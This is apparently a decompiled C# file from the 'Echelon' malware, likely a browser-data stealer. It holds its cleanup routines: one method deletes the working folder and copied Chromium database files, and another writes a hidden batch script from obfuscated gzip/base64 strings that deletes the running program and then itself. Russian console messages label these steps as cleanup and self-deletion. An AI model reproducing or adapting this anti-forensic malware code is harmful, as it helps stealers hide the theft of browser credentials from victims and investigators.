using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using ChromV1;

namespace Echelon.Global
{
	// Token: 0x02000042 RID: 66
	internal class Clean
	{
		// Token: 0x0600018D RID: 397 RVA: 0x0000C34C File Offset: 0x0000A54C
		public static void GetClean()
		{
			try
			{
				Console.WriteLine("Очистка рабочей папки");
				if (Directory.Exists(Help.dir))
				{
					Directory.Delete(Help.dir + "\\", true);
				}
				if (File.Exists(Chromium.bd))
				{
					File.Delete(Chromium.bd);
				}
				if (File.Exists(Chromium.ls))
				{
					File.Delete(Chromium.ls);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600018E RID: 398 RVA: 0x0000C3D4 File Offset: 0x0000A5D4
		public static void selfRemove()
		{
			if (Program.selfDelete)
			{
				Console.WriteLine("Самоудаление");
				string text = Path.GetTempFileName() + Decrypt.Get("H4sIAAAAAAAEANNLzk0BAMPCtLEEAAAA");
				using (StreamWriter streamWriter = new StreamWriter(text))
				{
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEAFNySE3OyFfIT0sDAP8G798KAAAA"));
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEACvJzE3NLy1RMFGwU/AL9QEAGpgiIA8AAAA="));
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\" /f /q");
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHN2UQAAQkDmIgMAAAA=") + Path.GetTempPath());
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + text + "\" /f /q");
				}
				Process.Start(new ProcessStartInfo
				{
					FileName = text,
					CreateNoWindow = true,
					ErrorDialog = false,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden
				});
			}
		}
	}
}
